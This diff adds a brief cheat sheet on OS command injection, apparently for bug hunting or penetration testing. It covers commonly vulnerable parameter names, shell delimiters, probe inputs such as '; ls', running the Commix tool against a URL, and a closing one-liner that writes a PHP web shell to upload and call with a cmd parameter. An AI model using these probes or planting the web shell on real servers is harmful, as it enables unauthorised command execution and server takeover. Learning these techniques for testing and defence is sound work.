@@ -1,0 +1,28 @@
+#Command Injection
+Operating System command injection arises when an application incorporates user-controllable data into a command that is      processed by a shell command interpreter .If the user data is strictly not validated,an attacker can use shell metacharacters to modify the command that is executed, and inject arbitrary further commands that will be executed by the server.
+
+#IMPACT
+	By exploiting a command injection vulnerability an attacker can abuse the function to inject his own operating system commands.This means he can easily take complete control over a web server.
+
+
+#POSSIBLE PARAMETERS FOR COMMAND INJECTION
+	daemon 		host	upload		dir		execute		download	log		ip		cli		cmd
+
+
+How to find there is a CMDi
+Use delimeter to break or continue the execution of CMDs there.
+    Delimeters:-  ;  ^  &  &&   |   ||  %0d  %0a  \n   <
+
+Hunting Methodology
+	 1.Find a input field whose interacting with operating system shell
+	 2.Try to execute system shell commands with delimeter
+    	 Example: ; ls
+        	      && ls
+        	      || ls
+                  
+
+Exploitation of CMDi
+	 1.Download Commix.   https://github.com/comixproject/commix.git
+	 2.python commix.py -u URL
+
+echo "<?php system(\$_GET['cmd']); ?>" > exploit.php            upload exploit.php        go to this file copy url and add ?cmd=ls   
